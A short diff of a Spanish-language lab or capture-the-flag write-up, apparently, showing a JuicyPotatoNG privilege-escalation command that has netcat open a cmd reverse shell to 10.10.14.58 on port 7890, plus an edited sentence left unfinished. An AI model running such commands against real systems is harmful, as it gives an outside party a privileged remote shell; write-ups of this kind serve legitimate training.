@@ -257,5 +257,5 @@ subimos la herramienta a la maquina victima
 ```python
 .\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.14.58 7890"
 ```
-con este comando vamos a decirle a la
+con este comando lanzamos la herramienta para que ejecute ``
 ![[Pasted image 20240402010411.png]]
